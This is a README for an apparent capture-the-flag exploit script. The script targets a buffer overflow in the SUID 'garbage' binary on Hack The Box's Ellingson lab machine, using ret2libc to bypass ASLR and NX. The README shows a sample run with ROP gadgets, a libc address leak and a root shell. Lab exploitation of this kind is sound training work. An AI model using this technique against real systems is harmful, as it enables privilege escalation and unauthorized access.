# ellingson-exploit.py

Exploits buffer overflow in `garbage` SUID bit binary on HTB's ellingson box.  Bypasses ASLR/NX via Ret2libc.

# Example run on HTB's Ellingson:

`python ellingson-exploit.py`

```
[*] Loaded cached gadgets for 'garbage'        
[*] 0x0000:         0x40179b pop rdi; ret      
    0x0008:         0x404028 [arg0] rdi = got.puts                                             
    0x0010:         0x401050                   
[+] Connecting to 10.10.10.139 on port 22: Done
[*] margo@10.10.10.139:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  4.15.0
    ASLR:     Enabled
[+] Starting remote process '/usr/bin/garbage' on 10.10.10.139: pid 1528
[+] leaked puts: 0x7fed431609c0
[*] libc addr: 0x7fed430e0000
[*] 0x0000:         0x40179b pop rdi; ret
    0x0008:              0x0 [arg0] rdi = 0
    0x0010:   0x7fed431c5970
    0x0018:         0x40179b pop rdi; ret
    0x0020:   0x7fed43293e9a [arg0] rdi = 140657010753178
    0x0028:   0x7fed4312f440
[*] Switching to interactive mode

access denied.
# $ 
```

### Requirements

Needs the `garbage` binary and `libc.so.6` from the target.
